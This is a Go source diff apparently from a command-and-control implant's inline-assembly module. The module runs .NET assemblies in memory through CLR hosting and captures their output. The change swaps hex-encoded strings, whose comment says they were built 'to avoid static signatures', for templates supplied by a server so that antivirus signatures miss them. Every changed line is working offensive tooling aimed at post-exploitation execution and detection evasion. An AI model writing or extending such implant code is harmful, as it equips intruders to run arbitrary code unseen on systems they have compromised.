@@ -11,6 +11,7 @@ import (
 	"path/filepath"
 	"runtime"
 	"strings"
+	"sync"
 	"syscall"
 	"time"
 	"unsafe"
@@ -75,14 +76,74 @@ var (
 	iaFnClose                 = string([]byte{0x5f, 0x63, 0x6c, 0x6f, 0x73, 0x65})                                                                                     // _close
 )
 
-// CLR strings (constructed to avoid static signatures)
-var (
-	iaClrV4        = string([]byte{0x76, 0x34})                                                 // v4
-	iaClrV2        = string([]byte{0x76, 0x32})                                                 // v2
-	iaClrV2Full    = string([]byte{0x76, 0x32, 0x2e, 0x30, 0x2e, 0x35, 0x30, 0x37, 0x32, 0x37}) // v2.0.50727
-	iaTempPrefix   = string([]byte{0x63, 0x6c, 0x72, 0x5f, 0x6f, 0x75, 0x74, 0x70, 0x75, 0x74, 0x5f}) // clr_output_
-	iaTempSuffix   = string([]byte{0x2e, 0x74, 0x78, 0x74})                                     // .txt
+// InlineAssemblyTemplate indices (must match server's common.go)
+const (
+	// CLR strings
+	idxIAClrV4      = 400
+	idxIAClrV2      = 401
+	idxIAClrV2Full  = 402
+	idxIATempPrefix = 403
+	idxIATempSuffix = 404
 )
+
+// Shared template storage for inline assembly
+var (
+	iaTemplate   []string
+	iaTemplateMu sync.RWMutex
+)
+
+// SetInlineAssemblyTemplate sets the shared inline assembly template (called from command processing)
+func SetInlineAssemblyTemplate(templates []string) {
+	iaTemplateMu.Lock()
+	iaTemplate = templates
+	iaTemplateMu.Unlock()
+}
+
+// iaTpl safely retrieves a template string by index
+func iaTpl(idx int) string {
+	iaTemplateMu.RLock()
+	defer iaTemplateMu.RUnlock()
+	if iaTemplate != nil && idx < len(iaTemplate) {
+		return iaTemplate[idx]
+	}
+	return ""
+}
+
+// Convenience functions for CLR strings with fallbacks
+func iaClrV4() string {
+	if s := iaTpl(idxIAClrV4); s != "" {
+		return s
+	}
+	return "v4"
+}
+
+func iaClrV2() string {
+	if s := iaTpl(idxIAClrV2); s != "" {
+		return s
+	}
+	return "v2"
+}
+
+func iaClrV2Full() string {
+	if s := iaTpl(idxIAClrV2Full); s != "" {
+		return s
+	}
+	return "v2.0.50727"
+}
+
+func iaTempPrefix() string {
+	if s := iaTpl(idxIATempPrefix); s != "" {
+		return s
+	}
+	return "clr_output_"
+}
+
+func iaTempSuffix() string {
+	if s := iaTpl(idxIATempSuffix); s != "" {
+		return s
+	}
+	return ".txt"
+}
 
 // Windows API declarations (initialized in init to use hex strings)
 var (
@@ -210,7 +271,7 @@ func executeWithFileCapture(assemblyBytes []byte, arguments []string) (string, i
 
 	// Create temp file for output
 	tempDir := os.TempDir()
-	outputFile := filepath.Join(tempDir, iaTempPrefix+fmt.Sprintf("%d", time.Now().UnixNano())+iaTempSuffix)
+	outputFile := filepath.Join(tempDir, iaTempPrefix()+fmt.Sprintf("%d", time.Now().UnixNano())+iaTempSuffix())
 
 	// Create file handle
 	outputPath, _ := syscall.UTF16PtrFromString(outputFile)
@@ -251,9 +312,9 @@ func executeWithFileCapture(assemblyBytes []byte, arguments []string) (string, i
 	}
 
 	// Detect runtime
-	targetRuntime := iaClrV4
-	if bytes.Contains(assemblyBytes, []byte(iaClrV2Full)) {
-		targetRuntime = iaClrV2
+	targetRuntime := iaClrV4()
+	if bytes.Contains(assemblyBytes, []byte(iaClrV2Full())) {
+		targetRuntime = iaClrV2()
 	}
 
 	// Execute assembly
@@ -292,9 +353,9 @@ func executeWithoutCapture(assemblyBytes []byte, arguments []string) (string, in
 		defer coUninitialize.Call()
 	}
 
-	targetRuntime := iaClrV4
-	if bytes.Contains(assemblyBytes, []byte(iaClrV2Full)) {
-		targetRuntime = iaClrV2
+	targetRuntime := iaClrV4()
+	if bytes.Contains(assemblyBytes, []byte(iaClrV2Full())) {
+		targetRuntime = iaClrV2()
 	}
 
 	retCode, execErr := clr.ExecuteByteArray(targetRuntime, assemblyBytes, arguments)
@@ -372,9 +433,9 @@ func executeWithSyncCapture(assemblyBytes []byte, arguments []string) (string, i
 	err := syscall.CreatePipe(&readPipe, &writePipe, nil, 1024*1024) // 1MB buffer
 	if err != nil {
 		// Detect runtime version
-		targetRuntime := iaClrV4
-		if bytes.Contains(assemblyBytes, []byte(iaClrV2Full)) {
-			targetRuntime = iaClrV2
+		targetRuntime := iaClrV4()
+		if bytes.Contains(assemblyBytes, []byte(iaClrV2Full())) {
+			targetRuntime = iaClrV2()
 		}
 		retCode, err := clr.ExecuteByteArray(targetRuntime, assemblyBytes, arguments)
 		return "", int(retCode), err
@@ -413,9 +474,9 @@ func executeWithSyncCapture(assemblyBytes []byte, arguments []string) (string, i
 	}
 
 	// Detect runtime version
-	targetRuntime := iaClrV4
-	if bytes.Contains(assemblyBytes, []byte(iaClrV2Full)) {
-		targetRuntime = iaClrV2
+	targetRuntime := iaClrV4()
+	if bytes.Contains(assemblyBytes, []byte(iaClrV2Full())) {
+		targetRuntime = iaClrV2()
 	}
 
 	// &] Executing assembly")
@@ -499,9 +560,9 @@ func executeWithTestCapture(assemblyBytes []byte, arguments []string) (string, i
 	}
 
 	// Detect runtime version
-	targetRuntime := iaClrV4
-	if bytes.Contains(assemblyBytes, []byte(iaClrV2Full)) {
-		targetRuntime = iaClrV2
+	targetRuntime := iaClrV4()
+	if bytes.Contains(assemblyBytes, []byte(iaClrV2Full())) {
+		targetRuntime = iaClrV2()
 	}
 
 	// Test 1: Can we execute at all?
